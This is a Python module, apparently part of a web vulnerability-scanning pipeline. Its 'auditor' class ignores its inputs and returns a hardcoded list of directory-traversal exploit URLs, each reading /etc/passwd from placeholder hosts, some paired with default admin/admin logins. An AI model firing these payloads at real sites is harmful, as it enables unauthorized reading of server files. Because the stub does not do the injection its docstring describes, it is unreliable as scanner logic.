from pipe import JSONPipe


class auditor(JSONPipe):
    '''Inject payloads to each endpoint and check if there is any vulnerability.
    '''

    def __init__(self):
        pass


    def process(self, incomings):
        '''Do the injection here.

        `incomings[0]` is a list of injection endpoints
        `incomings[1]` is a list of payloads

        return : a list of exploits, each exploit should have the following format
            {
                'url'    : 'http://url.to.a.page',
                'method' : 'GET/POST',
                'params' : {
                    'key'  : 'value',
                    'key2' : 'value2'
                },
                'headers' : {
                    'X-Foo' : 'Foo',
                    'X-Bar' : 'Bar'
                },
                'extras' : {
                    'auth' : {
                        'url' : 'http://login.page.url',
                        'method' : 'POST',
                        'action' : 'http://action.page.url',
                        'formField1' : 'value1',
                        'formField2' : 'value2'
                    }
                }
            }
        '''
        return [{
                    "url":"https://app3.com",
                    "loginCredentials":[{
                        "username":"",
                        "password":""
                    }],
                    "credentialFields":[{
                        "usernameBox":"",
                        "passwordBox":""
                    }],
                    "exploiturl":"https://app3.com/windows/code.php?file=../../../../../../etc/passwd"
                },
                {
                    "url":"https://app3.com",
                    "loginCredentials":[{
                        "username":"",
                        "password":""
                    }],
                    "credentialFields":[{
                        "usernameBox":"",
                        "passwordBox":""
                    }],
                    "exploiturl":"https://app3.com/windows/function.php?file=../../../../../../etc/passwd"
                },
                {	"url":"https://app5.com",
                    "loginCredentials":[{
                        "username":"",
                        "password":""
                    }],
                    "credentialFields":[{
                        "usernameBox":"",
                        "passwordBox":""
                    }],
                    "exploiturl":"https://app5.com/www/js/scripts.php?load=../../../../../../../../../etc/passwd"
                },
                {
                    "url":"https://app7.com/oc-admin/index.php?page=login",
                    "loginCredentials":[{
                        "username":"admin",
                        "password":"admin"
                    }],
                    "credentialFields":[{
                        "usernameBox":"user",
                        "passwordBox":"password"

                    }],
                    "exploiturl":"https://app7.com/oc-admin/?page=appearance&action=render&file=../../../../../../../../../../etc/passwd"
                },
                {
                    "url":"https://app9.com/index-test.php/site/login",
                    "loginCredentials":[{
                        "username":"admin",
                        "password":"admin"
                    }],
                    "credentialFields":[{
                        "usernameBox":"LoginForm[username]",
                        "passwordBox":"LoginForm[password]"
                     }],
                     "exploiturl":"https://app9.com/indextest.php/admin/translationManager?file=../../../../../../../../../../../../../../etc/passwd"

                }]

